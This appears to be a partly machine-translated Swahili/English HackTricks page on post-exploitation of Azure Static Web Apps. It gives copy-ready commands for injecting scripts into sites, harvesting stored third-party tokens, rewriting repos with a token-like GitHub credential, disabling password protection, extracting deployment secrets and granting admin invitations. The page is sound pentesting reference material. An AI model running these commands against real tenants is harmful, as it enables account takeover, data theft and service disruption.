# Az - Static Web Apps Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Azure Static Web Apps

Kwa habari zaidi kuhusu huduma hii angalia:

{{#ref}}
../az-services/az-static-web-apps.md
{{#endref}}

### Microsoft.Web/staticSites/snippets/write

Inawezekana kufanya ukurasa wa wavuti statiki upakie HTML yoyote kwa kuunda snippet. Hii inaweza kumruhusu attacker ku-inject JS code ndani ya web app na kuiba taarifa za siri kama credentials au mnemonic keys (in web3 wallets).

The following command create an snippet that will always be loaded by the web app::
```bash
az rest \
--method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/snippets/<snippet-name>?api-version=2022-03-01" \
--headers "Content-Type=application/json" \
--body '{
"properties": {
"name": "supersnippet",
"location": "Body",
"applicableEnvironmentsMode": "AllEnvironments",
"content": "PHNjcmlwdD4KYWxlcnQoIkF6dXJlIFNuaXBwZXQiKQo8L3NjcmlwdD4K",
"environments": [],
"insertBottom": false
}
}'
```
### Soma Cheti za Wahusika wa Tatu Zilizosanidiwa

Kama ilivyoelezwa katika sehemu ya App Service:

{{#ref}}
../az-privilege-escalation/az-app-services-privesc.md
{{#endref}}

Kwa kuendesha amri ifuatayo inawezekana **kusoma cheti za wahusika wa tatu** zilizosanidiwa katika akaunti ya sasa. Kumbuka kwamba, kwa mfano, ikiwa baadhi ya Github credentials zimesanidiwa kwa mtumiaji tofauti, hautaweza kufikia token kutoka kwa mtumiaji mwingine.
```bash
az rest --method GET \
--url "https://management.azure.com/providers/Microsoft.Web/sourcecontrols?api-version=2024-04-01"
```
Amri hii inarudisha tokens za Github, Bitbucket, Dropbox na OneDrive.

Hapa kuna baadhi ya mifano ya amri za kukagua tokens:
```bash
# GitHub – List Repositories
curl -H "Authorization: token <token>" \
-H "Accept: application/vnd.github.v3+json" \
https://api.github.com/user/repos

# Bitbucket – List Repositories
curl -H "Authorization: Bearer <token>" \
-H "Accept: application/json" \
https://api.bitbucket.org/2.0/repositories

# Dropbox – List Files in Root Folder
curl -X POST https://api.dropboxapi.com/2/files/list_folder \
-H "Authorization: Bearer <token>" \
-H "Content-Type: application/json" \
--data '{"path": ""}'

# OneDrive – List Files in Root Folder
curl -H "Authorization: Bearer <token>" \
-H "Accept: application/json" \
https://graph.microsoft.com/v1.0/me/drive/root/children
```
### Kuandika upya faili - Kuandika upya routes, HTML, JS...

Inawezekana **kuandika upya faili ndani ya Github repo** inayohifadhi app kupitia Azure ikiwa inamiliki **Github token**, kwa kutuma ombi kama lifuatalo ambalo litaonyesha njia ya faili ya kuandika upya, maudhui ya faili na ujumbe wa commit.

Hii inaweza kutumiwa vibaya na wadukuzi kwa msingi wa **kubadilisha yaliyomo ya web app** ili kuwasilisha maudhui ya hatari (steal credentials, mnemonic keys...) au kwa tu **kupeleka njia fulani upya** kwenye seva zao kwa kuandika upya faili `staticwebapp.config.json`.

> [!WARNING]
> Kumbuka kwamba ikiwa mshambulizi ataweza kudhoofisha usalama wa Github repo kwa njia yoyote, wanaweza pia kuandika upya faili hiyo moja kwa moja kutoka Github.
```bash
curl -X PUT "https://functions.azure.com/api/github/updateGitHubContent" \
-H "Content-Type: application/json" \
-d '{
"commit": {
"message": "Update static web app route configuration",
"branchName": "main",
"committer": {
"name": "Azure App Service",
"email": "donotreply@microsoft.com"
},
"contentBase64Encoded": "ewogICJuYXZpZ2F0aW9uRmFsbGJhY2siOiB7CiAgICAicmV3cml0ZSI6ICIvaW5kZXguaHRtbCIKICB9LAogICJyb3V0ZXMiOiBbCiAgICB7CiAgICAgICJyb3V0ZSI6ICIvcHJvZmlsZSIsCiAgICAgICJtZXRob2RzIjogWwogICAgICAgICJnZXQiLAogICAgICAgICJoZWFkIiwKICAgICAgICAicG9zdCIKICAgICAgXSwKICAgICAgInJld3JpdGUiOiAiL3AxIiwKICAgICAgInJlZGlyZWN0IjogIi9sYWxhbGEyIiwKICAgICAgInN0YXR1c0NvZGUiOiAzMDEsCiAgICAgICJhbGxvd2VkUm9sZXMiOiBbCiAgICAgICAgImFub255bW91cyIKICAgICAgXQogICAgfQogIF0KfQ==",
"filePath": "staticwebapp.config.json",
"message": "Update static web app route configuration",
"repoName": "carlospolop/my-first-static-web-app",
"sha": "4b6165d0ad993a5c705e8e9bb23b778dff2f9ca4"
},
"gitHubToken": "gho_1OSsm834ai863yKkdwHGj31927PCFk44BAXL"
}'
```
### Microsoft.Web/staticSites/config/write

Kwa ruhusa hii, inawezekana **kubadilisha nenosiri** linalolinda app ya wavuti isiyobadilika au hata kuondoa ulinzi kwa mazingira yote kwa kutuma ombi kama lifuatalo:
```bash
# Change password
az rest --method put \
--url "/subscriptions/<subcription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/config/basicAuth?api-version=2021-03-01" \
--headers 'Content-Type=application/json' \
--body '{
"name": "basicAuth",
"type": "Microsoft.Web/staticSites/basicAuth",
"properties": {
"password": "SuperPassword123.",
"secretUrl": "",
"applicableEnvironmentsMode": "AllEnvironments"
}
}'



# Remove the need of a password
az rest --method put \
--url "/subscriptions/<subcription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/config/basicAuth?api-version=2021-03-01" \
--headers 'Content-Type=application/json' \
--body '{
"name": "basicAuth",
"type": "Microsoft.Web/staticSites/basicAuth",
"properties": {
"secretUrl": "",
"applicableEnvironmentsMode": "SpecifiedEnvironments",
"secretState": "None"
}
}'
```
### Microsoft.Web/staticSites/listSecrets/action

Ruhusa hii inaruhusu kupata **API key deployment token** kwa ajili ya static app.

Kutumia az rest:
```bash
az rest --method POST \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/listSecrets?api-version=2023-01-01"
```
Kutumia AzCLI:
```bash
az staticwebapp secrets list --name <appname> --resource-group <RG>
```
Kisha, ili **update an app using the token** unaweza kuendesha amri ifuatayo. Kumbuka kuwa amri hii ilichukuliwa kwa kuangalia **jinsi Github Action [https://github.com/Azure/static-web-apps-deploy](https://github.com/Azure/static-web-apps-deploy) inavyofanya kazi**, kwani ndiyo Azure imeiweka kwa chaguo-msingi kutumia. Hivyo image na parameters zinaweza kubadilika wakati ujao.

> [!TIP]
> Ili kupeleka app unaweza kutumia zana ya **`swa`** kutoka [https://azure.github.io/static-web-apps-cli/docs/cli/swa-deploy#deployment-token](https://azure.github.io/static-web-apps-cli/docs/cli/swa-deploy#deployment-token) au fuata hatua zifuatazo:

1. Pakua repo [https://github.com/staticwebdev/react-basic](https://github.com/staticwebdev/react-basic) (au repo nyingine yoyote unayotaka kupeleka) na endesha `cd react-basic`.
2. Badilisha msimbo unaotaka kupeleka
3. Ipeleke kwa kuendesha amri ifuatayo (Kumbuka kubadilisha `<api-token>`):
```bash
docker run --rm -v $(pwd):/mnt mcr.microsoft.com/appsvc/staticappsclient:stable INPUT_AZURE_STATIC_WEB_APPS_API_TOKEN=<api-token> INPUT_APP_LOCATION="/mnt" INPUT_API_LOCATION="" INPUT_OUTPUT_LOCATION="build" /bin/staticsites/StaticSitesClient upload --verbose
```
> [!WARNING]
> Hata kama una token hautaweza ku-deploy app ikiwa **Deployment Authorization Policy** imewekwa kuwa **Github**. Kwa kutumia token utahitaji ruhusa `Microsoft.Web/staticSites/write` kubadilisha deployment method ili kutumia th APi token.

### Microsoft.Web/staticSites/write

Kwa ruhusa hii inawezekana **kubadilisha chanzo cha static web app kwenda repository tofauti ya Github**, hata hivyo, haitapigwa provisioning kiotomatiki kwani hii lazima ifanywe kutoka kwa Github Action.

Hata hivyo, ikiwa **Deployment Authotization Policy** imewekwa kuwa **Github**, inawezekana **kusasisha app kutoka kwenye repository ya chanzo mpya!**.

Iwapo **Deployment Authorization Policy** haijawekwa kuwa **Github**, unaweza kuibadilisha kwa ruhusa ile ile `Microsoft.Web/staticSites/write`.
```bash
# Change the source to a different Github repository
az staticwebapp update --name my-first-static-web-app --resource-group Resource_Group_1 --source https://github.com/carlospolop/my-first-static-web-app -b main

# Update the deployment method to Github
az rest --method PATCH \
--url "https://management.azure.com/subscriptions/<subscription-id>>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>?api-version=2022-09-01" \
--headers 'Content-Type=application/json' \
--body '{
"properties": {
"allowConfigFileUpdates": true,
"stagingEnvironmentPolicy": "Enabled",
"buildProperties": {
"appLocation": "/",
"apiLocation": "",
"appArtifactLocation": "build"
},
"deploymentAuthPolicy": "GitHub",
"repositoryToken": "<github_token>" # az rest --method GET --url "https://management.azure.com/providers/Microsoft.Web/sourcecontrols?api-version=2024-04-01"
}
}'
```
Mfano wa Github Action wa kupeleka app:
```yaml
name: Azure Static Web Apps CI/CD

on:
push:
branches:
- main
pull_request:
types: [opened, synchronize, reopened, closed]
branches:
- main

jobs:
build_and_deploy_job:
if: github.event_name == 'push' || (github.event_name == 'pull_request' && github.event.action != 'closed')
runs-on: ubuntu-latest
name: Build and Deploy Job
permissions:
id-token: write
contents: read
steps:
- uses: actions/checkout@v3
with:
submodules: true
lfs: false
- name: Install OIDC Client from Core Package
run: npm install @actions/core@1.6.0 @actions/http-client
- name: Get Id Token
uses: actions/github-script@v6
id: idtoken
with:
script: |
const coredemo = require('@actions/core')
return await coredemo.getIDToken()
result-encoding: string
- name: Build And Deploy
id: builddeploy
uses: Azure/static-web-apps-deploy@v1
with:
azure_static_web_apps_api_token: "12345cbb198a77a092ff885782a62a15d5aef5e3654cac1234509ab54547270704-4140ccee-e04f-424f-b4ca-3d4dd123459c00f0702071d12345" # A valid formatted token is needed although it won't be used for authentication
action: "upload"
###### Repository/Build Configurations - These values can be configured to match your app requirements. ######
# For more information regarding Static Web App workflow configurations, please visit: https://aka.ms/swaworkflowconfig
app_location: "/" # App source code path
api_location: "" # Api source code path - optional
output_location: "build" # Built app content directory - optional
github_id_token: ${{ steps.idtoken.outputs.result }}
###### End of Repository/Build Configurations ######

close_pull_request_job:
if: github.event_name == 'pull_request' && github.event.action == 'closed'
runs-on: ubuntu-latest
name: Close Pull Request Job
steps:
- name: Close Pull Request
id: closepullrequest
uses: Azure/static-web-apps-deploy@v1
with:
action: "close"
```
### Microsoft.Web/staticSites/resetapikey/action

Kwa ruhusa hii inawezekana **reset the API key of the static web app**, na hivyo kuweza DoSing workflows zinazodeploy app kiotomatiki.
```bash
az rest --method POST \
--url "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/staticSites/<app-name>/resetapikey?api-version=2019-08-01"
```
### Microsoft.Web/staticSites/createUserInvitation/action

Ruhusa hii inaruhusu **kuunda mwaliko kwa mtumiaji** ili kupata ufikiaji wa njia zilizo na ulinzi ndani ya static web app kwa cheo maalum kilichotolewa.

Sehemu ya kuingia iko katika njia kama `/.auth/login/github` kwa github au `/.auth/login/aad` kwa Entra ID na mtumiaji anaweza kualikwa kwa kutumia amri ifuatayo:
```bash
az staticwebapp users invite \
--authentication-provider Github # AAD, Facebook, GitHub, Google, Twitter \
--domain mango-beach-071d9340f.4.azurestaticapps.net # Domain of the app \
--invitation-expiration-in-hours 168 # 7 days is max \
--name my-first-static-web-app # Name of the app\
--roles "contributor,administrator" # Comma sepparated list of roles\
--user-details username # Github username in this case\
--resource-group Resource_Group_1 # Resource group of the app
```
### Pull Requests

Kwa chaguo-msingi Pull Requests kutoka tawi ndani ya repo hiyo zitaweza kucompile na kujengwa kiotomatiki katika mazingira ya staging. Hii inaweza kutumiwa vibaya na mshambuliaji mwenye ruhusa ya kuandika kwenye repo lakini asiyeweza kuvuka ulinzi wa tawi la production (kawaida `main`) ili **deploy toleo hatarishi la app** kwenye URL ya staging.

The staging URL has this format: `https://<app-subdomain>-<PR-num>.<region>.<res-of-app-domain>` like: `https://ambitious-plant-0f764e00f-2.eastus2.4.azurestaticapps.net`

> [!TIP]
> Kumbuka kwamba kwa chaguo-msingi external PRs hazitafanya run workflows isipokuwa wameruhusu (merged) angalau PR 1 ndani ya repository. Mshambuliaji anaweza kutuma PR halali kwenye repo na **kisha kutuma PR hatarishi** kwenye repo ili deploy app hatarishi katika mazingira ya staging. HATAKWAMBA, kuna ulinzi usiotarajiwa: default Github Action ya ku-deploy kwenye static web app inahitaji ufikiaji wa secret inayoshikilia deployment token (kama `secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_AMBITIOUS_PLANT_0F764E00F`) hata ikiwa deployment imefanywa kwa IDToken. Hii inamaanisha kwamba kwa kuwa external PR haitapata ufikiaji wa secret hii na external PR haiwezi kubadilisha Workflow kuweka token yoyote hapa bila PR kukubaliwa, **shambulio hili halitafanya kazi kwa kweli**.


{{#include ../../../banners/hacktricks-training.md}}
